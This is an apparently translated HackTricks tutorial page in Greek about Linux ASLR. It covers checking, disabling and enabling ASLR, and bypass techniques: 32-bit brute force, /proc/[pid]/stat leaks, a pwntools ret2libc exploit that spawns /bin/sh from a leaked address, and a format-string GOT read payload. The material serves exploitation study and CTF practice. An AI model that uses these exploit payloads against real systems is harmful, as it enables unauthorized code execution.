# ASLR

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks στο AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικές Πληροφορίες

Η **Τυχαία Ανάθεση Διάταξης Χώρου (ASLR)** είναι μια τεχνική ασφαλείας που χρησιμοποιείται σε λειτουργικά συστήματα για τη **τυχαία ανάθεση των διευθύνσεων μνήμης** που χρησιμοποιούνται από τις διεργασίες του συστήματος και τις εφαρμογές. Με αυτόν τον τρόπο, κάνει σημαντικά πιο δύσκολο για έναν εισβολέα να προβλέψει τη θέση συγκεκριμένων διεργασιών και δεδομένων, όπως η στοίβα, το σωρό και οι βιβλιοθήκες, με αποτέλεσμα τη μείωση ορισμένων τύπων εκμετάλλευσης, ιδιαίτερα των υπερχειλίσεων buffer.

### **Έλεγχος Κατάστασης ASLR**

Για να **ελέγξετε** την κατάσταση του ASLR σε ένα σύστημα Linux, μπορείτε να διαβάσετε την τιμή από το αρχείο `/proc/sys/kernel/randomize_va_space`. Η τιμή που αποθηκεύεται σε αυτό το αρχείο καθορίζει τον τύπο ASLR που εφαρμόζεται:

* **0**: Χωρίς τυχαίοποίηση. Όλα είναι στατικά.
* **1**: Συντηρητική τυχαίοποίηση. Οι κοινόχρηστες βιβλιοθήκες, η στοίβα, το mmap(), η σελίδα VDSO τυχαιοποιούνται.
* **2**: Πλήρης τυχαίοποίηση. Εκτός από τα στοιχεία που τυχαιοποιούνται από τη συντηρητική τυχαίοποίηση, η μνήμη που διαχειρίζεται μέσω του `brk()` τυχαιοποιείται.

Μπορείτε να ελέγξετε την κατάσταση του ASLR με την ακόλουθη εντολή:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Απενεργοποίηση του ASLR**

Για να **απενεργοποιήσετε** το ASLR, ορίζετε την τιμή του `/proc/sys/kernel/randomize_va_space` σε **0**. Η απενεργοποίηση του ASLR συνήθως δεν συνιστάται εκτός από περιπτώσεις ελέγχου ή αποσφαλμάτωσης. Ακολουθεί πως μπορείτε να το απενεργοποιήσετε:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Μπορείτε επίσης να απενεργοποιήσετε το ASLR για μια εκτέλεση με:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Ενεργοποίηση του ASLR**

Για να **ενεργοποιήσετε** το ASLR, μπορείτε να γράψετε μια τιμή **2** στο αρχείο `/proc/sys/kernel/randomize_va_space`. Αυτό απαιτεί συνήθως δικαιώματα ριζού. Η ενεργοποίηση πλήρους τυχαίοποίησης μπορεί να γίνει με την ακόλουθη εντολή:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Μόνιμη Διατήρηση Μετά την Επανεκκίνηση**

Οι αλλαγές που γίνονται με τις εντολές `echo` είναι προσωρινές και θα επαναφερθούν μετά από επανεκκίνηση. Για να κάνετε την αλλαγή μόνιμη, πρέπει να επεξεργαστείτε το αρχείο `/etc/sysctl.conf` και να προσθέσετε ή να τροποποιήσετε την παρακάτω γραμμή:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Μετά την επεξεργασία του `/etc/sysctl.conf`, εφαρμόστε τις αλλαγές με:
```bash
sudo sysctl -p
```
Αυτό θα εξασφαλίσει ότι οι ρυθμίσεις του ASLR παραμένουν μετά από επανεκκίνηση.

## **Παρακάμψεις**

### Βίαιη εξαναγκαστική επίθεση 32bit

Το PaX διαιρεί τον χώρο διεύθυνσης διεργασίας σε **3 ομάδες**:

* **Κώδικας και δεδομένα** (αρχικοποιημένα και μη αρχικοποιημένα): `.text`, `.data`, και `.bss` —> **16 bits** εντροπία στη μεταβλητή `delta_exec`. Αυτή η μεταβλητή αρχικοποιείται τυχαία με κάθε διεργασία και προστίθεται στις αρχικές διευθύνσεις.
* **Μνήμη** που εκχωρείται από την `mmap()` και **κοινές βιβλιοθήκες** —> **16 bits**, με την ονομασία `delta_mmap`.
* **Η στοίβα** —> **24 bits**, αναφέρεται ως `delta_stack`. Ωστόσο, χρησιμοποιεί πραγματικά **11 bits** (από τον 10ο έως τον 20ό byte συμπεριλαμβανομένου), ευθυγραμμισμένα σε **16 bytes** —> Αυτό οδηγεί σε **524,288 πιθανές πραγματικές διευθύνσεις στοίβας**.

Τα προηγούμενα δεδομένα αφορούν συστήματα 32-bit και η μειωμένη τελική εντροπία καθιστά δυνατή την παράκαμψη του ASLR με επαναλαμβανόμενη εκτέλεση μέχρι η εκμετάλλευση να ολοκληρωθεί με επιτυχία.

#### Ιδέες για βίαιη εξαναγκαστική επίθεση:

* Αν έχετε ένα αρκετά μεγάλο υπερχείλισμα για να φιλοξενήσετε ένα **μεγάλο NOP sled πριν το shellcode**, μπορείτε απλά να εξαναγκάσετε διευθύνσεις στη στοίβα μέχρι η ροή να **παραβιάσει κάποιο τμήμα του NOP sled**.
* Μια άλλη επιλογή γι' αυτό σε περίπτωση που το υπερχείλισμα δεν είναι τόσο μεγάλο και η εκμετάλλευση μπορεί να εκτελεστεί τοπικά είναι να **προστεθεί το NOP sled και το shellcode σε μεταβλητή περιβάλλοντος**.
* Αν η εκμετάλλευση είναι τοπική, μπορείτε να δοκιμάσετε να εξαναγκάσετε τη βασική διεύθυνση της libc (χρήσιμο για συστήματα 32bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Εάν επιτεθείτε σε ένα απομακρυσμένο διακομιστή, μπορείτε να δοκιμάσετε να **δοκιμάσετε με βία τη διεύθυνση της συνάρτησης `usleep` της `libc`**, περνώντας ως όρισμα τον αριθμό 10 (για παράδειγμα). Εάν σε κάποιο σημείο ο **διακομιστής καθυστερεί 10 δευτερόλεπτα περισσότερο για να ανταποκριθεί**, τότε βρήκατε τη διεύθυνση αυτής της συνάρτησης.

{% hint style="success" %}
Στα 64bit συστήματα η εντροπία είναι πολύ υψηλότερη και αυτό δεν είναι δυνατό.
{% endhint %}

### Τοπικές Πληροφορίες (`/proc/[pid]/stat`)

Το αρχείο **`/proc/[pid]/stat`** ενός διεργασίας είναι πάντα προσβάσιμο από όλους και περιέχει ενδιαφέρουσες πληροφορίες όπως:

* **startcode** & **endcode**: Διευθύνσεις πάνω και κάτω από το **TEXT** του δυαδικού
* **startstack**: Η διεύθυνση της αρχής του **stack**
* **start\_data** & **end\_data**: Διευθύνσεις πάνω και κάτω από όπου βρίσκεται το **BSS**
* **kstkesp** & **kstkeip**: Τρέχουσες διευθύνσεις **ESP** και **EIP**
* **arg\_start** & **arg\_end**: Διευθύνσεις πάνω και κάτω από όπου βρίσκονται οι **παράμετροι της γραμμής εντολών**
* **env\_start** & **env\_end**: Διευθύνσεις πάνω και κάτω από όπου βρίσκονται οι **μεταβλητές περιβάλλοντος**

Έτσι, εάν ο επιτιθέμενος βρίσκεται στον ίδιο υπολογιστή με το δυαδικό που εκμεταλλεύεται και αυτό το δυαδικό δεν περιμένει την υπερχείλιση από ωμές παραμέτρους, αλλά από μια διαφορετική **είσοδο που μπορεί να δημιουργηθεί μετά την ανάγνωση αυτού του αρχείου**. Είναι δυνατό για έναν επιτιθέμενο να **πάρει μερικές διευθύνσεις από αυτό το αρχείο και να κατασκευάσει μετατοπίσεις από αυτές για την εκμετάλλευση**.

{% hint style="success" %}
Για περισσότερες πληροφορίες σχετικά με αυτό το αρχείο ελέγξτε το [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) αναζητώντας το `/proc/pid/stat`
{% endhint %}

### Έχοντας μια διαρροή

* **Η πρόκληση είναι να δοθεί μια διαρροή**

Εάν σας δίνεται μια διαρροή (εύκολες προκλήσεις CTF), μπορείτε να υπολογίσετε μετατοπίσεις από αυτήν (υποθέτοντας για παράδειγμα ότι γνωρίζετε την ακριβή έκδοση της `libc` που χρησιμοποιείται στο σύστημα που εκμεταλλεύεστε). Αυτό το παράδειγμα εκμετάλλευσης εξάγεται από το [**παράδειγμα από εδώ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (ελέγξτε αυτήν τη σελίδα για περισσότερες λεπτομέρειες):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Κατάχρηση ενός buffer overflow θα ήταν δυνατό να εκμεταλλευτείτε ένα **ret2plt** για να εξαγάγετε μια διεύθυνση μιας συνάρτησης από την libc. Ελέγξτε:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Όπως και στο ret2plt, εάν έχετε ένα αυθαίρετο διάβασμα μέσω μιας ευπάθειας format strings, είναι δυνατό να εξάγετε τη διεύθυνση μιας **συνάρτησης της libc** από το GOT. Το ακόλουθο [**παράδειγμα είναι από εδώ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Μπορείτε να βρείτε περισσότερες πληροφορίες σχετικά με την ανάγνωση αυθαίρετων δεδομένων με format strings στο:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

Προσπαθήστε να παρακάμψετε το ASLR καταχρώμενοι διευθύνσεις μέσα στο stack:

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}
